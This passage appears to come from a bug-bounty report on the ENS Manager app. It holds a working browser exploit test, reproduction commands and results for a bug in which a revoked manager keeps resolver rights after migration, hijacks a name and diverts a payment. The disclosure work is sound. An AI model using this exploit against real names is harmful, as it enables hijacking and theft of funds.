expect(isAddress(readyPlanBeforeRevocation.hcaAddress)).toBe(true)
expect(readyPlanBeforeRevocation.hcaAddress).not.toBe(zeroAddress)
expect(readyPlanBeforeRevocation.migrationOwner.toLowerCase()).toBe(
  victim.address.toLowerCase(),
)
expect(readyPlanBeforeRevocation.managerAddress?.toLowerCase()).toBe(
  staleManager.address.toLowerCase(),
)
expect(
  countReadyPlanGrants({
    readyPlan: readyPlanBeforeRevocation,
    staleManager: staleManager.address,
    victim: victim.address,
    resource,
  }),
).toEqual({ stale: 1, victim: 0 })
const expectedHca = readyPlanBeforeRevocation.hcaAddress
const readyPlanBlock = await publicClient.getBlockNumber()

// V revokes A only after that A-bearing plan is fully executable.
const revocation = await send({
  account: victim,
  to: V1_BASE_REGISTRAR,
  data: encodeFunctionData({
    abi: BaseRegistrarAbi,
    functionName: 'reclaim',
    args: [tokenId, victim.address],
  }),
})
responseManager = victim.address
expect(revocation.receipt.blockNumber).toBeGreaterThan(readyPlanBlock)
expect(
  await publicClient.readContract({
    address: V1_ENS_REGISTRY,
    abi: V1RegistryAbi,
    functionName: 'owner',
    args: [node],
  }),
).toBe(victim.address)

// A has neither V1 nor V2 resolver authority after revocation.
await expect(
  publicClient.simulateContract({
    account: staleManager,
    address: V1_ENS_REGISTRY,
    abi: V1RegistryAbi,
    functionName: 'setResolver',
    args: [node, attackerResolver],
  }),
).rejects.toThrow()
await expect(
  publicClient.simulateContract({
    account: staleManager,
    address: V2_ETH_REGISTRY,
    abi: V2RegistryAbi,
    functionName: 'setResolver',
    args: [resource, attackerResolver],
  }),
).rejects.toThrow()

// Await a completed V-bearing response in the real active V1 QueryClient.
await refetchActiveV1Names(page)
await expect
  .poll(() => postRevocationFreshResponseCount, { timeout: 20_000 })
  .toBeGreaterThanOrEqual(1)
const cacheAfterRevocation = await readMigrationCacheState(page, name)
expect(cacheAfterRevocation.v1Manager?.toLowerCase()).toBe(
  victim.address.toLowerCase(),
)

// Query hash, dataUpdatedAt, HCA, owner, manager, and every encoded outer call
// must remain byte-for-byte equivalent to the pre-revocation ready snapshot.
expect(cacheAfterRevocation.readyPlan).toEqual(readyPlanBeforeRevocation)
expect(
  cacheAfterRevocation.readyPlan?.managerAddress?.toLowerCase(),
).toBe(staleManager.address.toLowerCase())

const confirmationStartedAt = Date.now()
if (postRevocationFreshResponseCompletedAt === null) {
  throw new Error('Fresh post-revocation V1 response did not complete')
}
expect(postRevocationFreshResponseCompletedAt).toBeLessThanOrEqual(
  confirmationStartedAt,
)
await confirmUpgrade.click()

// ... production wallet authorization and success polling omitted ...

const evidence = await scanForExploitEvidence({
  fromBlock: revocation.receipt.blockNumber + 1n,
  victim: victim.address,
  staleManager: staleManager.address,
  resource,
  expectedHca,
})
if (!evidence) throw new Error('Exploit evidence disappeared after success')

expect(evidence.transaction.from.toLowerCase()).toBe(
  victim.address.toLowerCase(),
)
expect(evidence.transaction.to?.toLowerCase()).toBe(expectedHca.toLowerCase())
const migrationReceipt = await publicClient.getTransactionReceipt({
  hash: evidence.transaction.hash,
})
expect(migrationReceipt.status).toBe('success')
expect(migrationReceipt.blockNumber).toBeGreaterThan(
  revocation.receipt.blockNumber,
)
expect(evidence.staleGrantCount).toBe(1)
expect(evidence.victimGrantCount).toBe(0)

// The complete role word is exactly ROLE_SET_RESOLVER, not a bitmap superset.
const staleRolesAfterMigration = await publicClient.readContract({
  address: V2_ETH_REGISTRY,
  abi: V2RegistryAbi,
  functionName: 'roles',
  args: [resource, staleManager.address],
})
expect(staleRolesAfterMigration).toBe(ROLE_SET_RESOLVER)
expect(
  await publicClient.readContract({
    address: V2_ETH_REGISTRY,
    abi: V2RegistryAbi,
    functionName: 'isApprovedForAll',
    args: [victim.address, expectedHca],
  }),
).toBe(false)

// A redirects real resolution and a fresh payer sends exactly 0.01 ETH to R.
const firstHijack = await send({
  account: staleManager,
  to: V2_ETH_REGISTRY,
  data: encodeFunctionData({
    abi: V2RegistryAbi,
    functionName: 'setResolver',
    args: [resource, attackerResolver],
  }),
})
const resolvedRecipient = await getEnsAddress(ensClient, {
  name,
  universalResolverAddress: UNIVERSAL_RESOLVER,
})
expect(resolvedRecipient).toBe(redirectRecipient.address)
if (!resolvedRecipient || !isAddress(resolvedRecipient)) {
  throw new Error('Universal Resolver did not return an address')
}

const paymentBlockBefore = await publicClient.getBlockNumber()
const redirectedBalanceBefore = await publicClient.getBalance({
  address: redirectRecipient.address,
  blockNumber: paymentBlockBefore,
})
const redirectedPayment = await send({
  account: independentPayer,
  to: resolvedRecipient,
  value: REDIRECTED_PAYMENT,
})
const redirectedPaymentTransaction = await publicClient.getTransaction({
  hash: redirectedPayment.hash,
})
expect(redirectedPaymentTransaction.from.toLowerCase()).toBe(
  independentPayer.address.toLowerCase(),
)
expect(redirectedPaymentTransaction.to?.toLowerCase()).toBe(
  resolvedRecipient.toLowerCase(),
)
expect(redirectedPaymentTransaction.value).toBe(REDIRECTED_PAYMENT)
const redirectedBalanceAfter = await publicClient.getBalance({
  address: redirectRecipient.address,
  blockNumber: redirectedPayment.receipt.blockNumber,
})
expect(redirectedBalanceAfter - redirectedBalanceBefore).toBe(
  REDIRECTED_PAYMENT,
)

// V repairs the resolver, but A's role survives and A re-hijacks afterward.
const victimRepair = await send({
  account: victim,
  to: V2_ETH_REGISTRY,
  data: encodeFunctionData({
    abi: V2RegistryAbi,
    functionName: 'setResolver',
    args: [resource, legitimateResolver],
  }),
})
expect(
  await publicClient.readContract({
    address: V2_ETH_REGISTRY,
    abi: V2RegistryAbi,
    functionName: 'hasRoles',
    args: [resource, ROLE_SET_RESOLVER, staleManager.address],
  }),
).toBe(true)

const secondHijack = await send({
  account: staleManager,
  to: V2_ETH_REGISTRY,
  data: encodeFunctionData({
    abi: V2RegistryAbi,
    functionName: 'setResolver',
    args: [resource, attackerResolver],
  }),
})
expect(secondHijack.receipt.blockNumber).toBeGreaterThan(
  victimRepair.receipt.blockNumber,
)
expect(
  await getEnsAddress(ensClient, {
    name,
    universalResolverAddress: UNIVERSAL_RESOLVER,
  }),
).toBe(redirectRecipient.address)
```

### Exact snapshot

| Snapshot                                         | Commit                                   |
| ------------------------------------------------ | ---------------------------------------- |
| Official audited upstream revision               | 63772fd872af472ced58b009499355f3430c2a86 |
| Immunefi mirror import used by the preserved run | cda79acaad59711b943fc68207ebb3f1d0ff8596 |

The preserved evidence was generated from a clean worktree at the locked mirror import. The Gist commit is pinned separately so later Gist edits cannot silently change the source or evidence reviewed with this report.

### Layout

```
parent/
├── audit-comp-ens/          # official repository at cda79aca...
└── ENS-001-Variant-PoC/     # complete pinned Secret Gist package
```

When cloning the Gist, use `git clone "https://gist.github.com/73662b3adfdf0dba6158ff3d1725fa8f.git" ENS-001-Variant-PoC`. When using GitHub's **Download ZIP** action, extract the archive and rename its Gist-derived top-level directory to `ENS-001-Variant-PoC`, then place it beside `audit-comp-ens`. This makes every command in `RUN.md` work unchanged.

### Requirements

* Git
* Docker
* Node.js 22 or later
* pnpm 10.27.0
* Foundry cast
* unzip
* Chromium
* Internet access for dependencies, container images, and the repository’s Sepolia fork

The preserved successful run used Node.js v26.0.0, Playwright 1.58.2, and the direct binaries installed through the repository. The repository declares pnpm 10.27.0 for clean reproduction.

### Verify the package

From parent:

```sh
cd ENS-001-Variant-PoC
sha256sum -c SHA256SUMS
unzip -tq ENS-001-variant-success-trace.zip
cd ..
```

On macOS, use:

```sh
shasum -a 256 -c SHA256SUMS
```

### Prepare the exact audited source

```sh
git clone https://github.com/immunefi-team/audit-comp-ens.git
git -C audit-comp-ens checkout --detach \
  cda79acaad59711b943fc68207ebb3f1d0ff8596

test "$(git -C audit-comp-ens rev-parse HEAD)" = \
  cda79acaad59711b943fc68207ebb3f1d0ff8596
test "$(git -C audit-comp-ens log -1 --format=%s)" = \
  "fork ensdomains/apps-monorepo at 63772fd872af472ced58b009499355f3430c2a86"
test -z "$(git -C audit-comp-ens status --porcelain)"
test "$(pnpm --version)" = 10.27.0

cd audit-comp-ens
pnpm install --frozen-lockfile
pnpm --dir e2e exec playwright install chromium
cd ..

test -e ENS-001-Variant-PoC/node_modules || \
  ln -s ../audit-comp-ens/packages/smart-account/node_modules \
  ENS-001-Variant-PoC/node_modules
test -x audit-comp-ens/e2e/node_modules/.bin/playwright
test -x ENS-001-Variant-PoC/node_modules/.bin/vitest
```

### Start local services

Terminal 1, from audit-comp-ens:

```sh
pnpm e2e:infra:up
cast block-number --rpc-url http://127.0.0.1:8545
```

Continue only after the block-number command succeeds.

Terminal 2, from audit-comp-ens:

```sh
pnpm --filter manager dev --mode ci --host 127.0.0.1
```

Wait for Manager at <http://127.0.0.1:3000>.

### Run the browser exploit and controls

Terminal 3, from parent:

```sh
POC_DIR="$(cd ENS-001-Variant-PoC && pwd)"
REPO_DIR="$(cd audit-comp-ens && pwd)"
RUN_DIR="$POC_DIR/reproduction-output"
test ! -e "$RUN_DIR"
mkdir "$RUN_DIR"

PLAYWRIGHT_JSON_OUTPUT_FILE="$RUN_DIR/ENS-001-variant-report.json" \
pnpm --dir "$REPO_DIR/e2e" exec playwright test \
  --config "$POC_DIR/ENS-001-variant.playwright.config.mjs" \
  --trace on \
  --output "$RUN_DIR/test-results" \
  --reporter=json

test "$(find "$RUN_DIR/test-results" -type f -name trace.zip | \
  wc -l | tr -d ' ')" = 1
TRACE_PATH="$(find "$RUN_DIR/test-results" -type f -name trace.zip)"
cp "$TRACE_PATH" "$RUN_DIR/ENS-001-variant-success-trace.zip"
cmp "$TRACE_PATH" "$RUN_DIR/ENS-001-variant-success-trace.zip"
unzip -tq "$RUN_DIR/ENS-001-variant-success-trace.zip"

"$POC_DIR/node_modules/.bin/vitest" run \
  --config "$POC_DIR/ENS-001-variant.vitest.config.ts" \
  --reporter=verbose
```

Cleanup only infrastructure started for reproduction:

```sh
cd audit-comp-ens
pnpm e2e:infra:down
```

### Expected result

Playwright must report:

```
expected: 1
unexpected: 0
flaky: 0
```

The preserved run printed the following material result:

```json
{
  "finding": "ENS-001",
  "variant": "ready-plan-revocation-to-registrant",
  "result": "EXPLOIT_CONFIRMED",
  "name": "ens001-ready-mtfvtmnt.eth",
  "victim": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
  "revokedManager": "0x70997970C51812dc3A010C7d01b50e0d17dc79C8",
  "redirectRecipient": "0x9F33D622843c1AC121fCa8D7977edEc2fE87eC6d",
  "readyPlanBlock": "11586563",
  "revocationBlock": "11586564",
  "migrationBlock": "11586567",
  "expectedPlanHca": "0x48B9c6898baFc8A3D3a495BF7c44CF3351486628",
  "migrationTransactionDestination": "0x48b9c6898bafc8a3d3a495bf7c44cf3351486628",
  "readyPlanManager": "0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
  "readyPlanUnchangedAfterRevocation": true,
  "freshResponseCompletedBeforeConfirmation": true,
  "confirmationUiHidesManagerAddresses": true,
  "staleGrantCount": 1,
  "correctLiveManagerGrantCount": 0,
  "hcaApprovalCleaned": true,
  "redirectedPaymentTransaction": "0xd0843df8144c2ef935b645d498bd007496654aaf5bf47de4a08654e63d486c20",
  "redirectedWei": "10000000000000000",
  "staleRolePersistedAfterRepair": true,
  "postRevocationFreshResponseCount": 2
}
```

Vitest must report:

```
Test Files  1 passed (1)
Tests       2 passed (2)
```

### What the browser PoC proves

In one continuous browser execution:

1. A is the real V1 manager when the production migration plan becomes ready.
2. The ready plan contains exactly one resolver-role grant to A and none to V.
3. V revokes A in a later block while remaining the BaseRegistrar token owner.
4. A has neither V1 manager authority nor a V2 resolver role after revocation, and both unauthorized resolver-write simulations fail.
5. A completed fresh response updates the real V1 QueryClient cache to V before confirmation.
6. The complete plan snapshot—including query identity, timestamp, HCA, migration owner, manager, and encoded calldata—remains unchanged.
7. The production confirmation dialog does not disclose either manager address.
8. V authorizes the normal production wallet flow.
9. The victim-originated mined transaction targets the plan-captured HCA and executes after revocation.
10. Its decoded calldata grants A exactly role 1 << 24 once and grants V no corresponding role.
11. V becomes V2 owner and the HCA’s temporary operator approval is cleaned.
12. A changes the migrated name to an attacker-controlled PermissionedResolver.
13. Universal Resolver returns fresh EOA R.
14. Distinct payer P transfers exactly 0.01 ETH to R and R’s balance increases by that amount.
15. V repairs the resolver.
16. A’s role remains, and A re-hijacks the resolver without another signature from V.

### Negative controls

The accompanying Vitest suite imports frozen production buildMigrationPlan and decodes its actual executeByOwner and grantRoles calldata:

1. A fresh plan constructed after A-to-V revocation has managerAddress null and emits no manager grant or manager-role expectation.
2. A fresh plan constructed after replacing A with B grants B exactly once and never grants or verifies A.

These controls establish the expected safe behavior and isolate retained pre-revocation plan execution as the cause of the stale grant.

### Test-only setup is not the exploit

The frozen external V1 indexer cannot observe a name created dynamically inside a local Sepolia fork. The test therefore:

* impersonates a controller that is already authorized at the frozen block to create a new V1 fixture registration;
* impersonates the V2 registrar to reserve the matching V2 fixture slot; and
* serves a V1 GraphQL response whose manager value is kept consistent with the local fork.

Those actions only establish a reproducible initial state. They do not grant A a post-migration V2 role and are not used to create the demonstrated impact.

During the security-critical sequence, the test does not mock:

* Manager UI or TanStack QueryClient;
* migration preflight or buildMigrationPlan;
* encoded HCA outer calls;
* wallet confirmations;
* HCA execution;
* V1 or V2 role state;
* ETHRegistry grantRoles or setResolver;
* PermissionedResolver behavior;
* Universal Resolver output;
* payer transaction;
* victim repair; or
* attacker re-hijacking.

Every security-relevant receipt, block ordering, role transition, transaction destination, calldata grant, balance change, and resolution result is asserted. The test snapshots the fork at entry and reverts it in finally.

### Evidence integrity

The preserved evidence was generated from a clean checkout at mirror commit cda79acaad59711b943fc68207ebb3f1d0ff8596, whose import message identifies audited upstream revision 63772fd872af472ced58b009499355f3430c2a86.

```
Primary E2E source SHA-256:
3edd55dd4755d97af1118bc52d9f27e11a3f6db0f9cb562869c9770f21e71a4a

Raw Playwright JSON SHA-256:
776905eba40392adb28aeb8d0347e8ec8f5aaec50be9ebad76a3e6f1a83e5728

Raw Playwright success trace SHA-256:
9d6ca1972e47ffb1b69c84e0dc6609f377ad92e2c0aad04fde71227a836fca37

Negative-control source SHA-256:
f28b8c392c99f1911931d9fcd410427397ede8d84563d579779da5344b6a6618

Preserved Vitest output SHA-256:
3a702cfa397833b8bf6a705ed6740c73726a72b0a5169771ec0937d887b6411c
```

The raw Playwright report records one expected test, zero unexpected tests, zero flaky tests, and no errors. The trace archive passes ZIP integrity validation, contains the final successful run, and embeds the 39,440-byte E2E source. The embedded source hash exactly matches the standalone PoC source hash.
